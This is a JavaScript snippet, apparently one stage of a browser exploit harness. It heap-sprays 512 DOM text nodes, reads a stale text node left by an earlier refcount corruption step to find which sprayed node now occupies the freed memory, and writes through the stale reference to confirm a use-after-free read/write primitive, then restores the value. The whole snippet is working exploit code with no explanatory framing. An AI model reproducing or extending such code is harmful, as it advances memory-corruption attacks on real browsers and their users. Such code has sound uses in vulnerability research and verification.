// Confirm a unique stale-read match with a reversible write to the live node.
var state = window.__fw14RefcountState;
var result;
var phase = "preflight";
var aliasIndex = -1;
var observed = null;
var observedType = null;
var writeAttempted = false;
var liveChanged = false;
var restored = null;
var restoreError = null;
try {
  if (!state || state.mode !== "mutated" || !state.textNode ||
      state.events.indexOf("list") < 0)
    throw new Error("missing_finalized_mutated_list");
  var root = document.createDocumentFragment();
  var allocated = [];
  phase = "spray";
  for (var i = 0; i < 512; i++) {
    var node = document.createTextNode("fw14-reuse-v2-" + i + "-unique");
    root.appendChild(node);
    allocated.push(node);
  }
  window.__fw14TextSpray = { root: root, allocated: allocated };
  if (api && typeof api.markSync === "function") api.markSync("stale_text_before_read");
  phase = "stale_read";
  observed = state.textNode.data;
  observedType = state.textNode.nodeType;
  for (var j = 0; j < allocated.length; j++) {
    if (observed === allocated[j].data) { aliasIndex = j; break; }
  }
  if (aliasIndex >= 0) {
    var live = allocated[aliasIndex];
    var originalLive = live.data;
    var token = "fw14-alias-write-v2-confirmed";
    if (api && typeof api.markSync === "function")
      api.markSync("stale_text_alias_" + aliasIndex);
    phase = "stale_write";
    if (api && typeof api.markSync === "function") api.markSync("stale_text_before_write");
    try {
      writeAttempted = true;
      state.textNode.data = token;
      liveChanged = live.data === token;
      if (api && typeof api.markSync === "function") api.markSync("stale_text_after_write");
    } finally {
      phase = "restore_live_node";
      try {
        live.data = originalLive;
        restored = live.data === originalLive;
      } catch (error) {
        restoreError = String(error).slice(0, 200);
        restored = false;
      }
      if (api && typeof api.markSync === "function") api.markSync("stale_text_after_restore");
    }
  }
  result = { id: "stale_text_reuse", status: restored === false ? "error" : "pass", details: {
    spray_count: allocated.length, observed_data: observed,
    observed_type: observedType, alias_index: aliasIndex,
    alias_wrapper_same: aliasIndex >= 0 ? state.textNode === allocated[aliasIndex] : null,
    write_attempted: writeAttempted, live_changed: liveChanged,
    restored: restored, restore_error: restoreError
  } };
} catch (error) {
  result = { id: "stale_text_reuse", status: "error", details: {
    phase: phase, observed_data: observed, observed_type: observedType,
    alias_index: aliasIndex, write_attempted: writeAttempted,
    live_changed: liveChanged, restored: restored, restore_error: restoreError,
    error: String(error).slice(0, 200)
  } };
}
return [result];
